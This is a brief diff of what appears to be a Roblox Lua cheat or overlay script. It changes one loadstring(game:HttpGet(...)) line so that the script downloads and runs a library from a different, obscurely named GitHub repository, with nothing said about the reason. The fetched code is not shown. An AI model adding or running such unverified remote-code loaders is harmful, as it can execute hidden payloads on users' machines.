@@ -10,7 +10,7 @@ local PlayerGui   = LocalPlayer.PlayerGui
 local Mouse       = LocalPlayer:GetMouse()
 local Camera      = workspace.CurrentCamera
 
-local DLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/f1nobe7650/other/main/plugins/3d%20drawings"))()
+local DLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/morendin943-alt/yes/refs/heads/main/yesssss"))()
 
 if not LPH_OBFUSCATED then  -- set these if not obfuscated so your script can run without obfuscation for when you are testing
     LPH_JIT_MAX = function(...) return (...) end;
